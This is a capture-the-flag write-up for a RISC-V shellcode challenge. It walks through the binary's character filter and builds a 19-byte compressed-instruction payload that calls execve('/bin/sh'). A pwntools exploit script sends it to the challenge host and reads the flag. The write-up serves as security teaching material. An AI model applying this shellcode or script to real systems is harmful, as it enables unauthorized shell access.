# 🛰️ Make Risc Great Again Writeup

<p align="center">
  <img src="https://img.shields.io/badge/Category-Pwn-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Architecture-RISC--V-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Technique-Shellcode-informational?style=for-the-badge">
</p>

---

## 🧠 Overview

> 🚨 **Mission:** Override a legacy RISC-V silo system
> 💣 **Objective:** Execute controlled shellcode under heavy constraints

This challenge provides a RISC-V binary that:

* Accepts only characters from `A` to `M`
* Maps each character to a specific byte
* Builds a buffer of **19 bytes**
* Executes it as code if a condition is met

👉 In short:

```text
User Input → Filter → Byte Mapping → Executed as Shellcode
```

---

## ⚙️ Binary Behavior

### 🔍 Input Processing

```c
for (i = 0; i < 19; i++) {
    c = getchar();

    switch(c) {
        case 'A': buffer[i] = 0x45;
        case 'B': buffer[i] = 0x65;
        case 'C': buffer[i] = 0x81;
        case 'D': buffer[i] = 0x01;
        case 'E': buffer[i] = 0x46;
        case 'F': buffer[i] = 0x47;
        case 'G': buffer[i] = 0x48;
        case 'H': buffer[i] = 0x55;
        case 'I': buffer[i] = 0x08;
        case 'J': buffer[i] = 0x0d;
        case 'K': buffer[i] = 0x73;
        case 'L': buffer[i] = 0xd0;
        case 'M': buffer[i] = 0x93;
        default:
            invalid_count++;
            i--;
    }
}
```

---

### 💥 Execution Trigger

```c
if (invalid_count > 70) {
    mmap(...)
    memcpy(...)
    execute(buffer)
}
```

📌 Meaning:

* Send **>70 invalid characters**
* Then exactly **19 valid characters**

---

## 🚧 Constraints

| Constraint              | Impact                      |
| ----------------------- | --------------------------- |
| Only `A–M` allowed      | Limited byte control        |
| 13 possible byte values | Hard to build instructions  |
| 19 bytes max            | Ultra small shellcode       |
| RISC-V architecture     | Requires specific knowledge |

---

## 🧪 Failed Approaches

### ❌ Random Payloads

```text
DDDDDDDDDDDDDDDDDDK
CCCCCCCCCCCCCCCCCCK
MMMMMMMMMMMMMMMMMMK
```

👉 Result:

* Code executed
* No visible effect

---

### ❌ Attempting Interactive Shell

```bash
(payload ; cat) | nc target
```

Then:

```bash
ls
id
```

👉 Result:

* Input echoed
* No command execution

🚫 Not a shell challenge

---

### ❌ Wrong Assumption

We initially thought:

* We needed a shell
* Or direct file read

But hint said:

```text
"provide the abort code"
```

👉 Meaning: syscall-based solution

---

## 🔑 Breakthrough

### 🔎 Finding `/bin/sh`

```bash
strings chal | grep "/bin/sh"
```

```text
/bin/sh
```

---

### 📍 Locating Address

```bash
readelf -S chal
```

```text
.shell → 0x15000
```

👉 So:

```text
/bin/sh = 0x15000
```

💥 Huge win: no need to construct string manually

---

## ⚙️ Strategy

We aim to execute:

```c
execve("/bin/sh", NULL, NULL)
```

---

### 🧠 RISC-V Syscall Convention

| Register | Role           |
| -------- | -------------- |
| a0       | filename       |
| a1       | argv           |
| a2       | envp           |
| a7       | syscall number |

```text
execve → a7 = 221
```

---

## 🧩 Using RISC-V Compressed Instructions (RVC)

Because of byte constraints, we use **16-bit instructions**

Using Capstone, we enumerate valid pairs:

```text
HB → c.lui a0, 0x15
CA → c.li a1, 0
DE → c.li a2, 0
```

---

## 💥 Final Payload

```text
HBCADEMILJDDDDDDDDK
```

---

## 🔬 Payload Breakdown

### 🧱 Step-by-Step

#### 1️⃣ Load `/bin/sh`

```asm
HB → c.lui a0, 0x15
→ a0 = 0x15000
```

---

#### 2️⃣ Set NULL arguments

```asm
CA → a1 = 0
DE → a2 = 0
```

---

#### 3️⃣ Set syscall

```asm
MILJ → addi a7, zero, 221
```

---

#### 4️⃣ Trigger syscall

```asm
K → 0x73 → ecall
```

---

#### 5️⃣ Padding

```text
DDDDDDDD → safe filler (nop-like)
```

---

## 🚀 Exploit Script

```python
from pwn import *

HOST = "167.86.100.105"
PORT = 5000

payload = b"Z"*71 + b"HBCADEMILJDDDDDDDDK"

io = remote(HOST, PORT)
io.recvuntil(b">>> ")
io.send(payload)
io.interactive()
```

---

## 🎯 Result

```bash
$ ls
chal  flag.txt

$ cat flag.txt
N7{R1SCV_s1l0_0v3rr1d3_c0mpl373}
```

---

## 🧠 Lessons Learned

* 🧩 Restricted shellcode requires creativity
* ⚙️ RISC-V ≠ x86 → different mindset
* ⚡ RVC instructions are powerful in constrained environments
* 🔍 Always enumerate valid instructions instead of guessing
* 📍 Reuse existing memory (like `/bin/sh`)

---

## 🏁 Conclusion

This challenge is a perfect mix of:

* Reverse Engineering 🔍
* Architecture Knowledge 🧠
* Shellcoding ⚙️
* Exploitation Strategy 💥

> 🔥 A great example of how constraints can lead to elegant solutions

---

<p align="center">
  🚀 Made with reverse engineering & persistence
</p>
